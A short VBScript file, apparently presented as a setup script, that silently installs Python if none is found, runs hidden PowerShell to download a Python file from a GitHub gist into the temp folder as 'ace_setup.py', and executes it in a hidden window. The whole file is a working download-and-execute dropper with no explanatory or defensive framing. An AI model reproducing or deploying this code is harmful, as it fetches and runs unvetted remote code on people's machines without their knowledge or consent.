Dim oShell, oFSO, tmpPath, pyExe
Set oShell = CreateObject("WScript.Shell")
Set oFSO   = CreateObject("Scripting.FileSystemObject")
tmpPath = oShell.ExpandEnvironmentStrings("%TEMP%") & "\ace_setup.py"
pyExe = ""

On Error Resume Next
Dim pyCheck : pyCheck = oShell.Exec("python --version")
If Err.Number = 0 Then pyExe = "python"
On Error GoTo 0

If pyExe = "" Then
    On Error Resume Next
    Dim pyCheck2 : pyCheck2 = oShell.Exec("py --version")
    If Err.Number = 0 Then pyExe = "py"
    On Error GoTo 0
End If

If pyExe = "" Then
    oShell.Run "winget install -e --id Python.Python.3 --silent --accept-package-agreements --accept-source-agreements", 0, True
    pyExe = "python"
End If

oShell.Run "powershell -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri 'https://gist.githubusercontent.com/brian04459/e2f1827ae71f87525dd1dce6f1c3ebe4/raw/setup.py' -OutFile '" & tmpPath & "' -UseBasicParsing""", 0, True

If oFSO.FileExists(tmpPath) Then
    oShell.Run pyExe & " """ & tmpPath & """", 0, False
End If
